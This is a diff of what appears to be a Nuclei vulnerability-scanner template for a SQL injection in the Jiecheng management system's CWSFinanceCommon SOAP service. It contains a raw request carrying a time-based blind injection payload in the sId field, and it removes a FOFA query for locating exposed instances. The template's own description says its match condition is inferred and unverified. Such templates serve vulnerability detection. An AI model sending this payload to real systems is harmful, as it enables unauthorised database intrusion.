@@ -3,17 +3,11 @@ info:
   name: 捷诚管理信息系统CWSFinanceCommon SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ukei29mxfp51h2e0
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ukei29mxfp51h2e0
-    fofa: body="/Scripts/EnjoyMsg.js"
 http:
 - raw:
-  - "POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1\n\nConnection: close\n\nAccept: */*\n\nAccept-Language: en\n\nContent-Type: text/xml; charset=utf-8\n\nAccept-Encoding: gzip\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\n  <soap:Body>\n\n    <GetOSpById xmlns=\"http://tempuri.org/\">\n\n      <sId>1';waitfor delay '0:0:5'--+</sId>\n\n    </GetOSpById>\n\n  </soap:Body>\n\n</soap:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n暂无"
+  - "POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1\n\nConnection: close\n\nAccept: */*\n\nAccept-Language: en\n\nContent-Type: text/xml; charset=utf-8\n\nAccept-Encoding: gzip\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\n  <soap:Body>\n\n    <GetOSpById xmlns=\"http://tempuri.org/\">\n\n      <sId>1';waitfor delay '0:0:5'--+</sId>\n\n    </GetOSpById>\n\n  </soap:Body>\n\n</soap:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n暂无"
   redirects: false
   matchers:
   - type: dsl
